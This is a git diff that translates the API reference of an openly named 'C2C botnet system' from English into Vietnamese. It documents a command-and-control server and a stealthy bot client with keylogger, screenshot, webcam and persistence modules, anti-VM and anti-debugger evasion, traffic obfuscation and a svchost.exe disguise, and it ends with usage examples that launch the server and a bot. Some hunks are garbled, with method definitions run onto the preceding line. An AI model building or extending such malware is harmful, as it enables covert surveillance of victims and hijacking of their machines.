@@ -1,22 +1,22 @@
-# 📚 API REFERENCE - C2C BOTNET SYSTEM
+# 📚 TÀI LIỆU THAM KHẢO API - HỆ THỐNG C2C BOTNET
 
 ## 📋 Mục Lục
-- [1. Core API Classes](#1-core-api-classes)
-- [2. Server API](#2-server-api)
-- [3. Client API](#3-client-api)
-- [4. Payload Module API](#4-payload-module-api)
-- [5. Utility API](#5-utility-api)
-- [6. Configuration API](#6-configuration-api)
-- [7. Events và Callbacks](#7-events-và-callbacks)
-- [8. Error Handling](#8-error-handling)
+- [1. Lớp API Cốt Lõi](#1-lớp-api-cốt-lõi)
+- [2. API Máy Chủ](#2-api-máy-chủ)
+- [3. API Máy Khách](#3-api-máy-khách)
+- [4. API Module Payload](#4-api-module-payload)
+- [5. API Tiện Ích](#5-api-tiện-ích)
+- [6. API Cấu Hình](#6-api-cấu-hình)
+- [7. Sự Kiện và Hàm Gọi Lại](#7-sự-kiện-và-hàm-gọi-lại)
+- [8. Xử Lý Lỗi](#8-xử-lý-lỗi)
 
 ---
 
-## 1. Core API Classes
+## 1. Lớp API Cốt Lõi
 
-### 🖥️ ThreadSafeServer Class
+### 🖥️ Lớp ThreadSafeServer
 
-#### Constructor
+#### Hàm Khởi Tạo
 ```python
 class ThreadSafeServer:
     def __init__(self, 
@@ -28,93 +28,93 @@ class ThreadSafeServer:
                  worker_threads: int = 32,
                  io_threads: int = 16):
         """
-        Initialize thread-safe C2C server.
+        Khởi tạo máy chủ C2C an toàn luồng.
         
-        Args:
-            host: Server bind address
-            port: Server port number
-            max_clients: Maximum concurrent clients
-            ssl_enabled: Enable SSL/TLS encryption
-            rate_limit: Requests per minute per client
-            worker_threads: Worker thread pool size
-            io_threads: I/O thread pool size
+        Tham số:
+            host: Địa chỉ liên kết máy chủ
+            port: Số cổng máy chủ
+            max_clients: Số lượng khách tối đa đồng thời
+            ssl_enabled: Bật mã hóa SSL/TLS
+            rate_limit: Số yêu cầu mỗi phút mỗi khách
+            worker_threads: Kích thước nhóm luồng worker
+            io_threads: Kích thước nhóm luồng I/O
         """
 ```
 
-#### Core Methods
+#### Phương Thức Cốt Lõi
 ```python
 def start_server(self) -> None:
-    """Start the C2C server with all security features."""
+    """Khởi động máy chủ C2C với tất cả tính năng bảo mật."""
 
 def stop_server(self) -> None:
-    """Gracefully shutdown server and cleanup resources."""
+    """Tắt máy chủ một cách duyên dáng và dọn dẹp tài nguyên."""
 
 def get_statistics(self) -> Dict[str, Any]:
     """
-    Get comprehensive server statistics.
+    Lấy thống kê toàn diện của máy chủ.
     
-    Returns:
-        Dict containing:
-        - active_clients: int
-        - total_sessions: int  
-        - data_transferred: int (bytes)
-        - uptime: float (seconds)
-        - success_rate: float (percentage)
-        - memory_usage: int (bytes)
-        - cpu_usage: float (percentage)
+    Trả về:
+        Dict chứa:
+        - active_clients: int - Số khách đang hoạt động
+        - total_sessions: int - Tổng số phiên
+        - data_transferred: int (bytes) - Dữ liệu đã chuyển
+        - uptime: float (seconds) - Thời gian hoạt động
+        - success_rate: float (percentage) - Tỷ lệ thành công
+        - memory_usage: int (bytes) - Sử dụng bộ nhớ
+        - cpu_usage: float (percentage) - Sử dụng CPU
     """
 
 def broadcast_command(self, command: str, clients: List[str] = None) -> Dict[str, Any]:
     """
-    Send command to multiple clients.
+    Gửi lệnh đến nhiều khách.
     
-    Args:
-        command: Command string to execute
-        clients: List of client IDs (None = all clients)
+    Tham số:
+        command: Chuỗi lệnh để thực thi
+        clients: Danh sách ID khách (None = tất cả khách)
         
-    Returns:
-        Dict mapping client_id -> response
+    Trả về:
+        Dict ánh xạ client_id -> phản hồi
     """
 
 def get_client_info(self, client_id: str) -> Optional[Dict[str, Any]]:
     """
-    Get detailed information about specific client.
+    Lấy thông tin chi tiết về khách cụ thể.
     
-    Args:
-        client_id: Unique client identifier
+    Tham số:
+        client_id: Định danh duy nhất của khách
         
-    Returns:
-        Dict with client details or None if not found
+    Trả về:
+        Dict với chi tiết khách hoặc None nếu không tìm thấy
     """
 ```
 
-#### Connection Management
+#### Quản Lý Kết Nối
 ```python
 @contextmanager
 def connection_context(self, client_socket: socket.socket):
-    """Context manager for safe connection handling."""
+    """Trình quản lý ngữ cảnh để xử lý kết nối an toàn."""
 
 def _handle_client(self, client_socket: socket.socket, client_address: tuple) -> None:
-    """Internal method to handle individual client connections."""
+    """Phương thức nội bộ để xử lý kết nối khách riêng lẻ."""
 
 def _cleanup_connection(self, client_socket: socket.socket) -> None:
-    """Clean up client connection resources."""
+    """Dọn dẹp tài nguyên kết nối khách."""
 
 def disconnect_client(self, client_id: str) -> bool:
     """
-    Disconnect specific client.
+    Ngắt kết nối khách cụ thể.
     
-    Args:
-        client_id: Client to disconnect
+    Tham số:
+        client_id: Khách cần ngắt kết nối
         
-    Returns:
-        True if successful, False otherwise
+    Trả về:
+        True nếu thành công, False nếu ngược lại
     """
 ```
 
-### 🤖 ThreadSafeClient Class
+### 🤖 Lớp ThreadSafeClient
 
-#### Constructor
+#### Hàm Khởi Tạo
 ```python
 class ThreadSafeClient:
     def __init__(self,
@@ -125,64 +125,64 @@ class ThreadSafeClient:
                  max_reconnect_attempts: int = 10,
                  stealth_mode: bool = False):
         """
-        Initialize thread-safe client.
+        Khởi tạo khách an toàn luồng.
         
-        Args:
-            server_host: C2C server address
-            server_port: C2C server port
-            auto_reconnect: Enable automatic reconnection
-            reconnect_delay: Delay between reconnect attempts
-            max_reconnect_attempts: Maximum reconnection tries
-            stealth_mode: Enable stealth operation mode
+        Tham số:
+            server_host: Địa chỉ máy chủ C2C
+            server_port: Cổng máy chủ C2C
+            auto_reconnect: Bật tự động kết nối lại
+            reconnect_delay: Độ trễ giữa các lần thử kết nối
+            max_reconnect_attempts: Số lần thử kết nối lại tối đa
+            stealth_mode: Bật chế độ hoạt động ẩn
         """
 ```
 
-#### Core Methods
+#### Phương Thức Cốt Lõi
 ```python
 def connect_to_server(self, host: str = None, port: int = None) -> bool:
     """
-    Connect to C2C server.
+    Kết nối đến máy chủ C2C.
     
-    Args:
-        host: Override default server host
-        port: Override default server port
+    Tham số:
+        host: Ghi đè địa chỉ máy chủ mặc định
+        port: Ghi đè cổng máy chủ mặc định
         
-    Returns:
-        True if connection successful
+    Trả về:
+        True nếu kết nối thành công
     """
 
 def disconnect(self) -> None:
-    """Disconnect from server and cleanup."""
+    """Ngắt kết nối khỏi máy chủ và dọn dẹp."""
 
 def send_command_result(self, command: str, result: str) -> bool:
     """
-    Send command execution result to server.
+    Gửi kết quả thực thi lệnh tới máy chủ.
     
     Args:
-        command: Original command
-        result: Execution result
+        command: Lệnh gốc
+        result: Kết quả thực thi
         
     Returns:
-        True if sent successfully
+        True nếu gửi thành công
     """
 
 def execute_command(self, command: str) -> str:
     """
-    Execute system command and return result.
+    Thực thi lệnh hệ thống và trả về kết quả.
     
     Args:
-        command: Command to execute
+        command: Lệnh cần thực thi
         
     Returns:
-        Command output or error message
+        Đầu ra lệnh hoặc thông báo lỗi
     """
 
 def get_system_info(self) -> Dict[str, Any]:
     """
-    Collect comprehensive system information.
+    Thu thập thông tin hệ thống toàn diện.
     
     Returns:
-        Dict with system details:
+        Dict chứa chi tiết hệ thống:
         - hostname, os, architecture
         - cpu_info, memory_info
         - network_interfaces
@@ -193,167 +193,166 @@ def get_system_info(self) -> Dict[str, Any]:
 
 ---
 
-## 2. Server API
+## 2. API Máy Chủ
 
-### 🔧 Configuration Management
+### 🔧 Quản Lý Cấu Hình
 
 ```python
 class ServerConfig:
     def __init__(self):
-        """Server configuration management."""
+        """Quản lý cấu hình máy chủ."""
         
     def update_config(self, config: Dict[str, Any]) -> None:
-        """Update server configuration."""
+        """Cập nhật cấu hình máy chủ."""
         
     def get_config(self, key: str = None) -> Any:
-        """Get configuration value(s)."""
+        """Lấy giá trị cấu hình."""
         
     def validate_config(self) -> List[str]:
-        """Validate current configuration, return errors."""
+        """Xác thực cấu hình hiện tại, trả về lỗi."""
 ```
 
-### 📊 Statistics và Monitoring
+### 📊 Thống Kê và Giám Sát
 
 ```python
 class ServerMonitor:
     def get_real_time_stats(self) -> Dict[str, Any]:
-        """Get real-time server statistics."""
+        """Lấy thống kê máy chủ theo thời gian thực."""
         
     def get_client_statistics(self) -> List[Dict[str, Any]]:
-        """Get statistics for all connected clients."""
+        """Lấy thống kê cho tất cả máy khách đã kết nối."""
         
     def get_performance_metrics(self) -> Dict[str, float]:
-        """Get server performance metrics."""
+        """Lấy chỉ số hiệu suất máy chủ."""
         
     def get_security_alerts(self) -> List[Dict[str, Any]]:
-        """Get recent security alerts."""
+        """Lấy các cảnh báo bảo mật gần đây."""
         
     def export_statistics(self, format: str = 'json') -> str:
-        """Export statistics in specified format."""
+        """Xuất thống kê theo định dạng chỉ định."""
 ```
 
-### 🔐 Security Management
+### 🔐 Quản Lý Bảo Mật
 
 ```python
 class SecurityManager:
     def generate_ssl_certificates(self, 
                                   key_size: int = 2048,
                                   validity_days: int = 365) -> bool:
-        """Generate new SSL certificates."""
+        """Tạo chứng chỉ SSL mới."""
         
     def validate_ssl_certificates(self) -> Dict[str, Any]:
-        """Validate current SSL certificates."""
+        """Xác thực chứng chỉ SSL hiện tại."""
         
     def update_cipher_suites(self, ciphers: str) -> None:
-        """Update SSL cipher suite configuration."""
+        """Cập nhật cấu hình bộ mã hóa SSL."""
         
     def enable_rate_limiting(self, 
                            requests_per_minute: int = 100,
                            block_duration: int = 300) -> None:
-        """Configure rate limiting."""
+        """Cấu hình giới hạn tốc độ."""
         
     def add_ip_to_whitelist(self, ip_address: str) -> None:
-        """Add IP to connection whitelist."""
+        """Thêm IP vào danh sách trắng kết nối."""
         
     def block_ip_address(self, ip_address: str, duration: int = 3600) -> None:
-        """Block IP address for specified duration."""
+        """Chặn địa chỉ IP trong thời gian chỉ định."""
 ```
 
 ---
 
-## 3. Client API
+## 3. API Máy Khách
 
-### 💻 System Operations
+### 💻 Hoạt Động Hệ Thống
 
 ```python
 class SystemOperations:
     def get_system_info(self) -> Dict[str, Any]:
-        """Collect detailed system information."""
+        """Thu thập thông tin hệ thống chi tiết."""
         
     def get_network_info(self) -> Dict[str, Any]:
-        """Get network configuration and connections."""
+        """Lấy cấu hình mạng và kết nối."""
         
     def get_process_list(self) -> List[Dict[str, Any]]:
-        """Get list of running processes."""
+        """Lấy danh sách các tiến trình đang chạy."""
         
     def kill_process(self, pid: int) -> bool:
-        """Terminate process by PID."""
+        """Kết thúc tiến trình theo PID."""
         
     def start_process(self, executable: str, args: List[str] = None) -> int:
-        """Start new process, return PID."""
+        """Khởi động tiến trình mới, trả về PID."""
 ```
 
-### 📁 File Operations
+### 📁 Hoạt Động File
 
 ```python
 class FileOperations:
     def list_directory(self, path: str) -> List[Dict[str, Any]]:
-        """List directory contents with metadata."""
+        """Liệt kê nội dung thư mục với metadata."""
         
     def read_file(self, file_path: str, binary: bool = False) -> bytes:
-        """Read file contents."""
+        """Đọc nội dung file."""
         
     def write_file(self, file_path: str, content: bytes) -> bool:
-        """Write data to file."""
+        """Ghi dữ liệu vào file."""
         
     def delete_file(self, file_path: str) -> bool:
-        """Delete file securely."""
-        
-    def download_file(self, remote_url: str, local_path: str) -> bool:
-        """Download file from URL."""
+        """Xóa file một cách an toàn."""
+          def download_file(self, remote_url: str, local_path: str) -> bool:
+        """Tải file từ URL."""
         
     def compress_file(self, file_path: str, output_path: str) -> bool:
-        """Compress file using ZIP."""
+        """Nén file sử dụng ZIP."""
 ```
 
-### 🌐 Network Operations
+### 🌐 Hoạt Động Mạng
 
 ```python
 class NetworkOperations:
     def scan_network(self, ip_range: str, ports: List[int] = None) -> List[Dict[str, Any]]:
-        """Scan network for active hosts and open ports."""
+        """Quét mạng để tìm host hoạt động và cổng mở."""
         
     def check_connectivity(self, host: str, port: int) -> bool:
-        """Test network connectivity to host:port."""
+        """Kiểm tra kết nối mạng tới host:port."""
         
     def get_external_ip(self) -> str:
-        """Get external IP address."""
+        """Lấy địa chỉ IP bên ngoài."""
         
     def get_wifi_networks(self) -> List[Dict[str, Any]]:
-        """Scan for available WiFi networks."""
+        """Quét mạng WiFi có sẵn."""
         
     def connect_wifi(self, ssid: str, password: str) -> bool:
-        """Connect to WiFi network."""
+        """Kết nối tới mạng WiFi."""
 ```
 
 ---
 
-## 4. Payload Module API
+## 4. API Module Payload
 
-### 📦 Base Payload Class
+### 📦 Lớp Payload Cơ Bản
 
 ```python
 class BasePayload:
     def __init__(self, client_instance):
-        """Base class for all payload modules."""
+        """Lớp cơ bản cho tất cả module payload."""
         self.client = client_instance
         self.config = {}
         self.running = False
         
     def start(self) -> bool:
-        """Start the payload module."""
+        """Khởi động module payload."""
         raise NotImplementedError
         
     def stop(self) -> bool:
-        """Stop the payload module."""
+        """Dừng module payload."""
         raise NotImplementedError
         
     def configure(self, config: Dict[str, Any]) -> None:
-        """Configure module parameters."""
+        """Cấu hình tham số module."""
         self.config.update(config)
         
     def get_status(self) -> Dict[str, Any]:
-        """Get module status and statistics."""
+        """Lấy trạng thái và thống kê module."""
         return {
             'running': self.running,
             'config': self.config,
@@ -361,7 +360,7 @@ class BasePayload:
         }
 ```
 
-### ⌨️ Keylogger Module API
+### ⌨️ API Module Keylogger
 
 ```python
 class KeyloggerPayload(BasePayload):
@@ -371,141 +370,138 @@ class KeyloggerPayload(BasePayload):
         self.capture_special_keys = True
         
     def start(self) -> bool:
-        """Start keystroke capture."""
+        """Bắt đầu ghi lại phím bấm."""
         
     def stop(self) -> bool:
-        """Stop keystroke capture."""
+        """Dừng ghi lại phím bấm."""
         
     def get_captured_keys(self) -> str:
-        """Retrieve captured keystrokes."""
+        """Lấy các phím đã ghi lại."""
         
     def clear_buffer(self) -> None:
-        """Clear keystroke buffer."""
+        """Xóa buffer phím bấm."""
         
     def set_buffer_size(self, size: int) -> None:
-        """Set maximum buffer size."""
+        """Đặt kích thước buffer tối đa."""
 ```
 
-### 📸 Screenshot Module API
+### 📸 API Module Screenshot
 
 ```python
 class ScreenshotPayload(BasePayload):
     def __init__(self, client_instance):
         super().__init__(client_instance)
         self.quality = 80
-        self.interval = 300  # seconds
-        
-    def take_screenshot(self, 
+        self.interval = 300  # giây
+          def take_screenshot(self, 
                        all_monitors: bool = False,
                        quality: int = None) -> bytes:
         """
-        Capture screenshot.
+        Chụp màn hình.
         
         Args:
-            all_monitors: Capture all monitors
-            quality: JPEG quality (1-100)
+            all_monitors: Chụp tất cả màn hình
+            quality: Chất lượng JPEG (1-100)
             
         Returns:
-            Screenshot as JPEG bytes
-        """
-        
+            Screenshot dưới dạng bytes JPEG
+        """        
     def start_scheduled_capture(self, interval: int = 300) -> bool:
-        """Start scheduled screenshot capture."""
+        """Bắt đầu chụp màn hình theo lịch."""
         
     def stop_scheduled_capture(self) -> bool:
-        """Stop scheduled captures."""
+        """Dừng chụp theo lịch."""
         
     def get_monitor_info(self) -> List[Dict[str, Any]]:
-        """Get information about available monitors."""
+        """Lấy thông tin về các màn hình có sẵn."""
 ```
 
-### 📹 Webcam Module API
+### 📹 API Module Webcam
 
 ```python
 class WebcamPayload(BasePayload):
     def list_cameras(self) -> List[Dict[str, Any]]:
-        """Get list of available cameras."""
+        """Lấy danh sách camera có sẵn."""
         
     def take_photo(self, camera_id: int = 0) -> bytes:
-        """Take photo from specified camera."""
+        """Chụp ảnh từ camera chỉ định."""
         
     def record_video(self, 
                     duration: int = 30,
                     camera_id: int = 0,
                     quality: str = 'medium') -> bytes:
-        """Record video for specified duration."""
+        """Quay video trong thời gian chỉ định."""
         
     def start_stream(self, camera_id: int = 0) -> bool:
-        """Start video streaming."""
+        """Bắt đầu streaming video."""
         
     def stop_stream(self) -> bool:
-        """Stop video streaming."""
+        """Dừng streaming video."""
 ```
 
-### 🔄 Persistence Module API
+### 🔄 API Module Persistence
 
 ```python
 class PersistencePayload(BasePayload):
     def install_registry_persistence(self, 
                                    executable_path: str,
                                    key_name: str = None) -> bool:
-        """Install registry-based persistence."""
+        """Cài đặt persistence dựa trên registry."""
         
     def install_task_persistence(self,
                                 executable_path: str,
                                 task_name: str = None,
                                 trigger: str = 'logon') -> bool:
-        """Install scheduled task persistence."""
+        """Cài đặt persistence task đã lập lịch."""
         
     def install_service_persistence(self,
                                   executable_path: str,
                                   service_name: str = None) -> bool:
-        """Install Windows service persistence."""
+        """Cài đặt persistence dịch vụ Windows."""
         
     def remove_persistence(self, method: str = 'all') -> bool:
-        """Remove specified persistence methods."""
+        """Xóa các phương thức persistence chỉ định."""
         
     def check_persistence_status(self) -> Dict[str, bool]:
-        """Check status of all persistence methods."""
+        """Kiểm tra trạng thái của tất cả phương thức persistence."""
 ```
 
 ---
 
-## 5. Utility API
+## 5. API Tiện Ích
 
-### 🔐 Crypto Utilities
+### 🔐 Tiện Ích Mã Hóa
 
 ```python
 class CryptoManager:
     def __init__(self, key: bytes = None):
-        """Initialize with encryption key."""
+        """Khởi tạo với khóa mã hóa."""
         
     def generate_key(self) -> bytes:
-        """Generate new encryption key."""
+        """Tạo khóa mã hóa mới."""
         
     def encrypt_data(self, data: bytes) -> bytes:
-        """Encrypt data using AES."""
+        """Mã hóa dữ liệu sử dụng AES."""
         
     def decrypt_data(self, encrypted_data: bytes) -> bytes:
-        """Decrypt AES encrypted data."""
+        """Giải mã dữ liệu đã mã hóa AES."""
         
     def hash_data(self, data: bytes, algorithm: str = 'sha256') -> str:
-        """Generate hash of data."""
+        """Tạo hash của dữ liệu."""
         
     def generate_rsa_keypair(self, key_size: int = 2048) -> Tuple[bytes, bytes]:
-        """Generate RSA public/private key pair."""
+        """Tạo cặp khóa công khai/riêng tư RSA."""
 ```
 
 ### 🛡️ Anti-VM Detection
 
 ```python
-class VMDetector:
-    def detect_vm_environment(self) -> Dict[str, Any]:
+class VMDetector:    def detect_vm_environment(self) -> Dict[str, Any]:
         """
-        Detect virtual machine environment.
+        Phát hiện môi trường máy ảo.
         
         Returns:
-            Dict with detection results:
+            Dict với kết quả phát hiện:
             - is_vm: bool
             - confidence: float (0-1)
             - indicators: List[str]
@@ -513,132 +509,131 @@ class VMDetector:
         """
         
     def check_vm_processes(self) -> List[str]:
-        """Check for VM-related processes."""
+        """Kiểm tra các tiến trình liên quan đến VM."""
         
     def check_vm_registry(self) -> List[str]:
-        """Check registry for VM indicators."""
+        """Kiểm tra registry để tìm dấu hiệu VM."""
         
     def check_vm_files(self) -> List[str]:
-        """Check filesystem for VM indicators."""
+        """Kiểm tra hệ thống file để tìm dấu hiệu VM."""
         
     def check_hardware_signatures(self) -> List[str]:
-        """Check hardware signatures for VM."""
+        """Kiểm tra chữ ký phần cứng cho VM."""
 ```
 
-### 🔍 Memory Protection
+### 🔍 Bảo Vệ Bộ Nhớ
 
 ```python
 class MemoryProtector:
     def protect_process_memory(self, pid: int = None) -> bool:
-        """Enable memory protection for process."""
+        """Bật bảo vệ bộ nhớ cho tiến trình."""
         
     def detect_debugger(self) -> bool:
-        """Detect if debugger is attached."""
+        """Phát hiện nếu debugger được gắn kết."""
         
     def anti_dump_protection(self) -> bool:
-        """Enable anti-memory dump protection."""
+        """Bật bảo vệ chống dump bộ nhớ."""
         
     def clear_sensitive_memory(self, memory_regions: List[int]) -> None:
-        """Securely clear sensitive memory regions."""
+        """Xóa an toàn các vùng bộ nhớ nhạy cảm."""
         
     def randomize_memory_layout(self) -> bool:
-        """Enable memory layout randomization."""
+        """Bật tính năng ngẫu nhiên hóa layout bộ nhớ."""
 ```
 
-### 🌐 Network Protection
+### 🌐 Bảo Vệ Mạng
 
 ```python
 class NetworkProtector:
     def detect_packet_capture(self) -> bool:
-        """Detect if network traffic is being captured."""
+        """Phát hiện nếu lưu lượng mạng đang bị chặn bắt."""
         
     def enable_traffic_obfuscation(self) -> bool:
-        """Enable network traffic obfuscation."""
+        """Bật tính năng che giấu lưu lượng mạng."""
         
     def check_proxy_settings(self) -> Dict[str, Any]:
-        """Check system proxy configuration."""
+        """Kiểm tra cấu hình proxy hệ thống."""
         
     def detect_network_monitoring(self) -> List[str]:
-        """Detect network monitoring tools."""
+        """Phát hiện các công cụ giám sát mạng."""
         
     def randomize_traffic_patterns(self) -> None:
-        """Randomize network traffic patterns."""
+        """Ngẫu nhiên hóa các mẫu lưu lượng mạng."""
 ```
 
 ---
 
-## 6. Configuration API
+## 6. API Cấu Hình
 
-### ⚙️ Server Configuration
+### ⚙️ Cấu Hình Máy Chủ
 
 ```python
 class ServerConfiguration:
-    # Network settings
+    # Cài đặt mạng
     HOST = '0.0.0.0'
     PORT = 4444
     MAX_CLIENTS = 1000
     
-    # SSL/TLS settings
+    # Cài đặt SSL/TLS
     SSL_ENABLED = True
     SSL_CERT_PATH = 'server_cert.pem'
     SSL_KEY_PATH = 'server_key.pem'
     SSL_MINIMUM_VERSION = ssl.TLSVersion.TLSv1_2
     
-    # Threading settings
+    # Cài đặt threading
     WORKER_THREADS = 32
     IO_THREADS = 16
     CONNECTION_TIMEOUT = 30
     
-    # Security settings
-    RATE_LIMIT = 100  # requests per minute
+    # Cài đặt bảo mật
+    RATE_LIMIT = 100  # yêu cầu mỗi phút
     ENABLE_IP_WHITELIST = False
     AUTO_BLOCK_SUSPICIOUS_IPS = True
     
-    # Logging settings
+    # Cài đặt logging
     LOG_LEVEL = logging.INFO
     LOG_FILE = 'server.log'
     ENABLE_AUDIT_LOG = True
     
     def update_from_dict(self, config: Dict[str, Any]) -> None:
-        """Update configuration from dictionary."""
-        
-    def validate(self) -> List[str]:
-        """Validate configuration, return error list."""
+        """Cập nhật cấu hình từ dictionary."""
+          def validate(self) -> List[str]:
+        """Xác thực cấu hình, trả về danh sách lỗi."""
         
     def save_to_file(self, file_path: str) -> None:
-        """Save configuration to file."""
+        """Lưu cấu hình vào file."""
         
     def load_from_file(self, file_path: str) -> None:
-        """Load configuration from file."""
+        """Tải cấu hình từ file."""
 ```
 
-### 🤖 Client Configuration
+### 🤖 Cấu Hình Máy Khách
 
 ```python
 class ClientConfiguration:
-    # Connection settings
+    # Cài đặt kết nối
     SERVER_HOST = 'localhost'
     SERVER_PORT = 4444
     AUTO_RECONNECT = True
     RECONNECT_DELAY = 5
     MAX_RECONNECT_ATTEMPTS = 10
     
-    # Stealth settings
+    # Cài đặt stealth
     STEALTH_MODE = False
     PROCESS_NAME = 'svchost.exe'
     HIDE_WINDOW = True
     ANTI_VM_ENABLED = True
     
-    # Operation settings
+    # Cài đặt hoạt động
     COMMAND_TIMEOUT = 60
     HEARTBEAT_INTERVAL = 30
     DATA_COLLECTION_INTERVAL = 300
     
-    # Persistence settings
+    # Cài đặt persistence
     ENABLE_PERSISTENCE = True
     PERSISTENCE_METHODS = ['registry', 'task_scheduler']
     
-    # Security settings
+    # Cài đặt bảo mật
     ENABLE_ENCRYPTION = True
     OBFUSCATE_TRAFFIC = True
     ENABLE_CERTIFICATE_PINNING = True
@@ -646,173 +641,173 @@ class ClientConfiguration:
 
 ---
 
-## 7. Events và Callbacks
+## 7. Sự Kiện và Hàm Gọi Lại
 
-### 📡 Server Events
+### 📡 Sự Kiện Máy Chủ
 
 ```python
 class ServerEvents:
     def on_client_connected(self, client_info: Dict[str, Any]) -> None:
-        """Called when new client connects."""
+        """Được gọi khi máy khách mới kết nối."""
         
     def on_client_disconnected(self, client_id: str, reason: str) -> None:
-        """Called when client disconnects."""
+        """Được gọi khi máy khách ngắt kết nối."""
         
     def on_command_executed(self, 
                           client_id: str,
                           command: str,
                           result: str,
                           execution_time: float) -> None:
-        """Called when command execution completes."""
+        """Được gọi khi việc thực thi lệnh hoàn tất."""
         
     def on_security_alert(self, alert_type: str, details: Dict[str, Any]) -> None:
-        """Called when security alert is triggered."""
+        """Được gọi khi cảnh báo bảo mật được kích hoạt."""
         
     def on_error(self, error_type: str, error_message: str) -> None:
-        """Called when error occurs."""
+        """Được gọi khi xảy ra lỗi."""
 
-# Usage example
+# Ví dụ sử dụng
 def register_event_handlers(server: ThreadSafeServer):
-    server.events.on_client_connected = lambda info: print(f"New client: {info['hostname']}")
+    server.events.on_client_connected = lambda info: print(f"Máy khách mới: {info['hostname']}")
     server.events.on_security_alert = lambda type, details: log_security_event(type, details)
 ```
 
-### 🤖 Client Events
+### 🤖 Sự Kiện Máy Khách
 
 ```python
 class ClientEvents:
     def on_connected_to_server(self) -> None:
-        """Called when successfully connected to server."""
+        """Được gọi khi kết nối thành công tới máy chủ."""
         
     def on_disconnected_from_server(self, reason: str) -> None:
-        """Called when disconnected from server."""
+        """Được gọi khi ngắt kết nối khỏi máy chủ."""
         
     def on_command_received(self, command: str) -> None:
-        """Called when command is received from server."""
+        """Được gọi khi nhận lệnh từ máy chủ."""
         
     def on_module_started(self, module_name: str) -> None:
-        """Called when payload module starts."""
+        """Được gọi khi module payload khởi động."""
         
     def on_module_stopped(self, module_name: str) -> None:
-        """Called when payload module stops."""
+        """Được gọi khi module payload dừng."""
 ```
 
 ---
 
-## 8. Error Handling
+## 8. Xử Lý Lỗi
 
-### ❌ Exception Classes
+### ❌ Lớp Exception
 
 ```python
 class C2CException(Exception):
-    """Base exception for C2C operations."""
+    """Exception cơ bản cho các hoạt động C2C."""
     pass
 
 class ConnectionError(C2CException):
-    """Raised when connection fails."""
+    """Phát sinh khi kết nối thất bại."""
     pass
 
 class AuthenticationError(C2CException):
-    """Raised when authentication fails."""
+    """Phát sinh khi xác thực thất bại."""
     pass
 
 class CommandExecutionError(C2CException):
-    """Raised when command execution fails."""
+    """Phát sinh khi thực thi lệnh thất bại."""
     pass
 
 class ModuleError(C2CException):
-    """Raised when payload module operation fails."""
+    """Phát sinh khi hoạt động module payload thất bại."""
     pass
 
 class SecurityError(C2CException):
-    """Raised when security violation detected."""
+    """Phát sinh khi phát hiện vi phạm bảo mật."""
     pass
 
 class ConfigurationError(C2CException):
-    """Raised when configuration is invalid."""
+    """Phát sinh khi cấu hình không hợp lệ."""
     pass
 ```
 
-### 🔧 Error Handling Examples
+### 🔧 Ví Dụ Xử Lý Lỗi
 
 ```python
-# Server error handling
+# Xử lý lỗi máy chủ
 try:
     server = ThreadSafeServer()
     server.start_server()
 except ConfigurationError as e:
-    logger.error(f"Configuration error: {e}")
+    logger.error(f"Lỗi cấu hình: {e}")
     sys.exit(1)
 except SecurityError as e:
-    logger.critical(f"Security error: {e}")
+    logger.critical(f"Lỗi bảo mật: {e}")
     server.emergency_shutdown()
 except Exception as e:
-    logger.exception(f"Unexpected error: {e}")
+    logger.exception(f"Lỗi không mong đợi: {e}")
 
-# Client error handling
+# Xử lý lỗi máy khách
 try:
     client = ThreadSafeClient()
     if not client.connect_to_server():
-        raise ConnectionError("Failed to connect to server")
+        raise ConnectionError("Không thể kết nối tới máy chủ")
         
     result = client.execute_command("sysinfo")
 except ConnectionError as e:
-    logger.error(f"Connection failed: {e}")
+    logger.error(f"Kết nối thất bại: {e}")
     client.attempt_reconnection()
 except CommandExecutionError as e:
-    logger.warning(f"Command execution failed: {e}")
+    logger.warning(f"Thực thi lệnh thất bại: {e}")
     client.send_error_report(str(e))
 ```
 
-### 📝 Logging API
+### 📝 API Logging
 
 ```python
 class LogManager:
     def __init__(self, log_level: int = logging.INFO):
-        """Initialize logging manager."""
+        """Khởi tạo trình quản lý logging."""
         
     def log_event(self, 
                   level: int,
                   message: str,
                   category: str = 'general',
                   client_id: str = None) -> None:
-        """Log event with metadata."""
+        """Ghi log sự kiện với metadata."""
         
     def log_security_event(self,
                           event_type: str,
                           severity: str,
                           details: Dict[str, Any]) -> None:
-        """Log security-related event."""
+        """Ghi log sự kiện liên quan đến bảo mật."""
         
     def log_command_execution(self,
                             client_id: str,
                             command: str,
                             result: str,
                             execution_time: float) -> None:
-        """Log command execution."""
+        """Ghi log việc thực thi lệnh."""
         
     def export_logs(self,
                    start_time: datetime = None,
                    end_time: datetime = None,
                    format: str = 'json') -> str:
-        """Export logs in specified format."""
+        """Xuất logs theo định dạng chỉ định."""
 ```
 
 ---
 
-## 📖 Usage Examples
+## 📖 Ví Dụ Sử Dụng
 
-### 🚀 Basic Server Setup
+### 🚀 Thiết Lập Máy Chủ Cơ Bản
 
 ```python
 from core.server import ThreadSafeServer
 from utils.logger import LogManager
 import logging
 
-# Initialize logging
+# Khởi tạo logging
 log_manager = LogManager(logging.INFO)
 
-# Create and configure server
+# Tạo và cấu hình máy chủ
 server = ThreadSafeServer(
     host='0.0.0.0',
     port=4444,
@@ -820,51 +815,51 @@ server = ThreadSafeServer(
     ssl_enabled=True
 )
 
-# Register event handlers
-server.events.on_client_connected = lambda info: print(f"New bot: {info['hostname']}")
+# Đăng ký event handlers
+server.events.on_client_connected = lambda info: print(f"Bot mới: {info['hostname']}")
 server.events.on_security_alert = lambda type, details: log_manager.log_security_event(type, 'HIGH', details)
 
-# Start server
+# Khởi động máy chủ
 try:
     server.start_server()
-    print("✅ C2C Server started successfully")
+    print("✅ Máy chủ C2C đã khởi động thành công")
 except Exception as e:
-    print(f"❌ Failed to start server: {e}")
+    print(f"❌ Không thể khởi động máy chủ: {e}")
 ```
 
-### 🤖 Basic Client Setup
+### 🤖 Thiết Lập Máy Khách Cơ Bản
 
 ```python
 from client import ThreadSafeClient
 from payload.modules.keylogger import KeyloggerPayload
 from payload.modules.screenshot import ScreenshotPayload
 
-# Create client instance
+# Tạo instance máy khách
 client = ThreadSafeClient(
     server_host='192.168.1.100',
     server_port=4444,
     stealth_mode=True
 )
 
-# Load payload modules
+# Tải các module payload
 keylogger = KeyloggerPayload(client)
 screenshot = ScreenshotPayload(client)
 
-# Connect to server
+# Kết nối tới máy chủ
 if client.connect_to_server():
-    print("✅ Connected to C2C server")
+    print("✅ Đã kết nối tới máy chủ C2C")
     
-    # Start payload modules
+    # Khởi động các module payload
     keylogger.start()
     screenshot.start_scheduled_capture(interval=300)
